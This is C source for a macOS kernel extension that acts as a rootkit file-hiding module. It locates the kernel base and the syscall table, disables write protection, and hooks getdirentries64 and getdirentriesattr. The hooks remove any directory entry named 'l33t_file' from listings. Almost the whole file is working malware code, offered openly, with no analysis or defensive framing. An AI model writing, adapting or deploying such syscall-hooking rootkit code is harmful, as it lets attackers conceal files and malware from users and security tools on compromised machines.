//
//  FileHider.c
//

#include "FileHider.h"

kern_return_t FileHider_start(kmod_info_t * ki, void *d)
{
    if( find_kernel_baseaddr() == -1 )
    {
        DLOG( "[+] Error: Unable to find kernel base address!\n");
        return KERN_FAILURE;
    }
    
    struct sysent *table = find_sysent();
    
    if( table == NULL )
    {
        DLOG( "[+] Error: Unable to resolve _nsysent!\n" );
        return KERN_FAILURE;
    }
    else
        DLOG( "[+] Found _sysent @ %p\n", table );
    
    /* backup */
    org_getdirentries64 = (void *) table[ SYS_getdirentries64 ].sy_call;
    org_getdirentriesattr = (void *) table[ SYS_getdirentriesattr ].sy_call;
    
    /* place hooks */
    DISABLE_WRITE_PROTECTION();
    table[ SYS_getdirentries64 ].sy_call = (void *) new_getdirentries64;
    table[ SYS_getdirentriesattr ].sy_call = (void *) new_getdirentriesattr;
    ENABLE_WRITE_PROTECTION();
        
    return KERN_SUCCESS;
}

kern_return_t FileHider_stop(kmod_info_t *ki, void *d)
{
    if( find_kernel_baseaddr() == -1 )
    {
        DLOG( "[+] Error: Unable to find kernel base address!\n");
        return KERN_FAILURE;
    }
    
    struct sysent *table = find_sysent();
    
    if( table == NULL )
    {
        DLOG( "[+] Error: Unable to resolve _nsysent!\n" );
        return KERN_FAILURE;
    }
    
    /* restore original syscalls */
    DISABLE_WRITE_PROTECTION();
    table[ SYS_getdirentries64 ].sy_call = (void *) org_getdirentries64;
    table[ SYS_getdirentriesattr ].sy_call = (void *) org_getdirentriesattr;
    ENABLE_WRITE_PROTECTION();
    
    return KERN_SUCCESS;
}

static char fname[] = "l33t_file";

//register_t new_getdirentries64( struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval )
int new_getdirentries64( struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval )
{
    int ret;
    u_int64_t bcount = 0;
    u_int64_t btot = 0;
    size_t buffersize = 0;
    struct direntry *dirp;
    void *mem = NULL;
    int updated = 0;
    
    ret = org_getdirentries64( p, uap, retval );
    btot = buffersize = bcount = *retval;
    
    if( bcount > 0 )
    {
        MALLOC( mem, void *, bcount, M_TEMP, M_WAITOK );
        
        if( mem == NULL )
            return(ret);
        
        copyin( uap->buf, mem, bcount );
        dirp = mem;
        
        while( bcount > 0 && dirp->d_reclen > 0 )
        {
            if( strncmp( dirp->d_name, (char *) &fname, strlen( (char *) &fname ) ) == 0 )
            {
                char *next = (char *) dirp + dirp->d_reclen;
                u_int64_t offset = (char *) next - (char *) mem;
                bcount -= dirp->d_reclen;
                btot -= dirp->d_reclen;
                bcopy( next, dirp, buffersize - offset );
                updated = 1;
                continue;
            }
            
            bcount -= dirp->d_reclen;
            dirp = (struct direntry *) ((char *) dirp + dirp->d_reclen);
        }
        
        if( updated == 1 )
        {
            copyout( mem, uap->buf, btot );
            *retval = btot;
        }
        
        FREE( mem, M_TEMP );
    }
    return ret;
}

struct FInfoAttrBuf {
    u_int32_t       length;
    attrreference_t name;
    fsobj_type_t    objType;
    char            finderInfo[ 32 ];
    u_int32_t       dirStatus;
} __attribute__( ( aligned(4), packed ) );

typedef struct FInfoAttrBuf FInfoAttrBuf;

//register_t new_getdirentriesattr( struct proc *p, struct getdirentriesattr_args *uap, register_t *retval )
int new_getdirentriesattr( struct proc *p, struct getdirentriesattr_args *uap, register_t *retval )
{
    struct FInfoAttrBuf *dirp;
    //register_t ret;
    int ret;
    int removed = 0;
    u_int count = 0;
    size_t buffersize = 0;
    void *mem = NULL;
    
    ret = org_getdirentriesattr( p, uap, retval );
    copyin( uap->count, &count, sizeof( u_int ) );
    buffersize = uap->buffersize;
    if( count > 0 && buffersize > 0 )
    {
        MALLOC( mem, void *, buffersize, M_TEMP, M_WAITOK );
        
        if( mem == NULL )
            return(ret);
        
        copyin( uap->buffer, mem, buffersize );
        dirp = (struct FInfoAttrBuf *) mem;
        
        while( count > 0 )
        {
            char *name = ( (char *) &dirp->name + dirp->name.attr_dataoffset );
            
            if( strncmp( name, fname, strlen( (char*)fname ) ) == 0 )
            {
                char *next = ( (char *) dirp + dirp->length );
                u_int64_t offset = (char *) next - (char *) mem;
                bcopy( next, dirp, buffersize - offset );
                removed++;
                count--;
                if(count == 0)
                    break;
                continue;
            }
            
            dirp = (struct FInfoAttrBuf *) ( (char *) dirp + dirp->length );
            count--;
        }
        
        if( removed > 0 )
        {
            copyin( uap->count, &count, sizeof( u_int ) );
            count -= removed;
            copyout( &count, uap->count, sizeof(u_int) );
            copyout( mem, uap->buffer, buffersize );
        }
        
        FREE( mem, M_TEMP );
    }
    return ret;
}

static struct sysent *find_sysent( void )
{
    struct sysent *table;
    int *nsysent = ( int * ) find_symbol( (struct mach_header_64 *) KERNEL_MH_START_ADDR, "_nsysent" );

    if( nsysent == NULL )
        return NULL;
    else
        DLOG( "[+] Found _nsysent @ %p\n", nsysent );
    
    // not working on Mountain Lion since memory layout has changed:
    //      table = (struct sysent *)(((uint64_t)nsysent) -
    //                               ((uint64_t)sizeof(struct sysent) *
    //                               (uint64_t)*nsysent));
    // so we're off for some dirty brute forcing:
    
    int *addr = nsysent;
    
    while( 1 )  // o.0!
    {
        table = ( struct sysent * ) addr;
        
        if (table[SYS_syscall].sy_narg == 0 &&
            table[SYS_exit].sy_narg == 1  &&
            table[SYS_fork].sy_narg == 0 &&
            table[SYS_read].sy_narg == 3 &&
            table[SYS_wait4].sy_narg == 4 &&
            table[SYS_ptrace].sy_narg == 4)
        {
            return table;
        }
        
        addr++;
    }
    
    return NULL;
}

struct segment_command_64 *
find_segment_64(struct mach_header_64 *mh, const char *segname)
{
    struct load_command *lc;
    struct segment_command_64 *seg, *foundseg = NULL;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == LC_SEGMENT_64) {
            /* Check load command's segment name */
            seg = (struct segment_command_64 *)lc;
            if (strcmp(seg->segname, segname) == 0) {
                foundseg = seg;
                break;
            }
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the segment (NULL if we didn't find it) */
    return foundseg;
}

struct section_64 *
find_section_64(struct segment_command_64 *seg, const char *name)
{
    struct section_64 *sect, *foundsect = NULL;
    u_int i = 0;
    
    /* First section begins straight after the segment header */
    for (i = 0, sect = (struct section_64 *)((uint64_t)seg + (uint64_t)sizeof(struct segment_command_64));
         i < seg->nsects;
         i++, sect = (struct section_64 *)((uint64_t)sect + sizeof(struct section_64)))
    {
        /* Check section name */
        if (strcmp(sect->sectname, name) == 0) {
            foundsect = sect;
            break;
        }
    }
    
    /* Return the section (NULL if we didn't find it) */
    return foundsect;
}

struct load_command *
find_load_command(struct mach_header_64 *mh, uint32_t cmd)
{
    struct load_command *lc, *foundlc;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == cmd) {
            foundlc = (struct load_command *)lc;
            break;
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the load command (NULL if we didn't find it) */
    return foundlc;
}

void *
find_symbol(struct mach_header_64 *mh, const char *name)
{
    struct symtab_command *msymtab = NULL;
    struct segment_command_64 *mlc = NULL;
    struct segment_command_64 *mlinkedit = NULL;
    void *mstrtab = NULL;
    
    struct nlist_64 *nl = NULL;
    char *str;
    uint64_t i;
    void *addr = NULL;
    
    /*
     * Check header
     */
    if (mh->magic != MH_MAGIC_64) {
        DLOG("FAIL: magic number doesn't match - 0x%x\n", mh->magic);
        return NULL;
    }
    
    /*
     * Find TEXT section
     */
    mlc = find_segment_64(mh, SEG_TEXT);
    if (!mlc) {
        DLOG("FAIL: couldn't find __TEXT\n");
        return NULL;
    }
    
    /*
     * Find the LINKEDIT and SYMTAB sections
     */
    mlinkedit = find_segment_64(mh, SEG_LINKEDIT);
    if (!mlinkedit) {
        DLOG("FAIL: couldn't find __LINKEDIT\n");
        return NULL;
    }
    
    msymtab = (struct symtab_command *)find_load_command(mh, LC_SYMTAB);
    if (!msymtab) {
        DLOG("FAIL: couldn't find SYMTAB\n");
        return NULL;
    }
    
    //DLOG( "[+] __TEXT.vmaddr      0x%016llX\n", mlc->vmaddr );
    //DLOG( "[+] __LINKEDIT.vmaddr  0x%016llX\n", mlinkedit->vmaddr );
    //DLOG( "[+] __LINKEDIT.vmsize  0x%08llX\n", mlinkedit->vmsize );
    //DLOG( "[+] __LINKEDIT.fileoff 0x%08llX\n", mlinkedit->fileoff );
    //DLOG( "[+] LC_SYMTAB.stroff   0x%08X\n", msymtab->stroff );
    //DLOG( "[+] LC_SYMTAB.strsize  0x%08X\n", msymtab->strsize );
    //DLOG( "[+] LC_SYMTAB.symoff   0x%08X\n", msymtab->symoff );
    //DLOG( "[+] LC_SYMTAB.nsyms    0x%08X\n", msymtab->nsyms );
    
    /*
     * Enumerate symbols until we find the one we're after
     *
     *  Be sure to use NEW calculation STRTAB in Mountain Lion!
     */
    mstrtab = (void *)((int64_t)mlinkedit->vmaddr + (msymtab->stroff - mlinkedit->fileoff));
    
    // First nlist_64 struct is NOW located @:
    for (i = 0, nl = (struct nlist_64 *)(mlinkedit->vmaddr + (msymtab->symoff - mlinkedit->fileoff));
         i < msymtab->nsyms;
         i++, nl = (struct nlist_64 *)((uint64_t)nl + sizeof(struct nlist_64)))
    {
        str = (char *)mstrtab + nl->n_un.n_strx;
        
        if (strcmp(str, name) == 0) {
            addr = (void *)nl->n_value;
        }
    }
    
    /* Return the address (NULL if we didn't find it) */
    return addr;
}

uint64_t find_kernel_baseaddr( )
{
    uint8_t idtr[ 10 ];
    uint64_t idt = 0;
    
    __asm__ volatile ( "sidt %0": "=m" ( idtr ) );
    
    idt = *( ( uint64_t * ) &idtr[ 2 ] );
    struct descriptor_idt *int80_descriptor = NULL;
    uint64_t int80_address = 0;
    uint64_t high = 0;
    uint32_t middle = 0;
    
    int80_descriptor = _MALLOC( sizeof( struct descriptor_idt ), M_TEMP, M_WAITOK );
    bcopy( (void*)idt, int80_descriptor, sizeof( struct descriptor_idt ) );
    
    high = ( unsigned long ) int80_descriptor->offset_high << 32;
    middle = ( unsigned int ) int80_descriptor->offset_middle << 16;
    int80_address = ( uint64_t )( high + middle + int80_descriptor->offset_low );
    
    uint64_t temp_address = int80_address;
    uint8_t *temp_buffer = _MALLOC( 4, M_TEMP, M_WAITOK );
    
    while( temp_address > 0 )
    {
        bcopy( ( void * ) temp_address, temp_buffer, 4 );
        if ( *( uint32_t * )( temp_buffer ) == MH_MAGIC_64 )
        {
            KERNEL_MH_START_ADDR = temp_address;
            return 0;
        }
        temp_address -= 1;
    }
    
    return -1;
}